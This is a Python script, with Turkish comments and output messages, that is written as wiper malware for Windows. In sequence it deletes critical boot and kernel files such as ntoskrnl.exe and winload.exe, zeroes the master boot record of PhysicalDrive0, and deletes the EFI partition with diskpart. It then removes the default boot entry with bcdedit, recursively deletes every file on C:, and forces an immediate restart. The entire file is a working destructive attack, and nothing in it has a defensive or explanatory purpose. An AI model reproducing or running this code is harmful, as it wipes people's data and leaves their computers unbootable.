import os
import subprocess
import shutil

# ==========================================
# 1. KRİTİK SİSTEM DOSYALARINI SİL
# ==========================================
def delete_system_files():
    files = [
        "C:\\bootmgr",
        "C:\\Boot\\BCD",
        "C:\\Windows\\System32\\winload.exe",
        "C:\\Windows\\System32\\winload.efi",
        "C:\\Windows\\System32\\winlogon.exe",
        "C:\\Windows\\System32\\hal.dll",
        "C:\\Windows\\System32\\ntoskrnl.exe",
        "C:\\Windows\\System32\\ntdll.dll"
    ]
    for f in files:
        try:
            if os.path.exists(f):
                os.remove(f)
                print(f"[+] Silindi: {f}")
        except Exception as e:
            print(f"[-] Silinemedi: {f} - {e}")

# ==========================================
# 2. MBR (MASTER BOOT RECORD) SİL
# ==========================================
def wipe_mbr():
    try:
        with open("\\\\.\\PhysicalDrive0", "wb") as f:
            f.write(b'\x00' * 512)
        print("[+] MBR silindi!")
    except Exception as e:
        print(f"[-] MBR silinemedi: {e}")

# ==========================================
# 3. EFI PARTİSYON SİL
# ==========================================
def delete_efi():
    try:
        subprocess.run('diskpart /c "select disk 0" /c "select partition 1" /c "delete partition override"', shell=True)
        print("[+] EFI partition silindi!")
    except Exception as e:
        print(f"[-] EFI silinemedi: {e}")

# ==========================================
# 4. BCD SİL
# ==========================================
def delete_bcd():
    try:
        subprocess.run('bcdedit /delete {default} /f', shell=True, capture_output=True)
        print("[+] BCD silindi!")
    except Exception as e:
        print(f"[-] BCD silinemedi: {e}")

# ==========================================
# 5. TÜM DOSYALARI SİL (DISK)
# ==========================================
def wipe_disk():
    try:
        os.system('del /f /s /q C:\\* >nul 2>&1')
        print("[+] Tüm dosyalar silindi!")
    except Exception as e:
        print(f"[-] Disk silinemedi: {e}")

# ==========================================
# 6. HEP BİRLİKTE ÇALIŞTIR
# ==========================================
if __name__ == "__main__":
    print("[*] Sistem silme işlemi başlatıldı...")
    
    delete_system_files()
    wipe_mbr()
    delete_efi()
    delete_bcd()
    wipe_disk()
    
    print("[+] Sistem tamamen bozuldu!")
    
    # Bilgisayarı yeniden başlat
    os.system("shutdown /r /t 0")
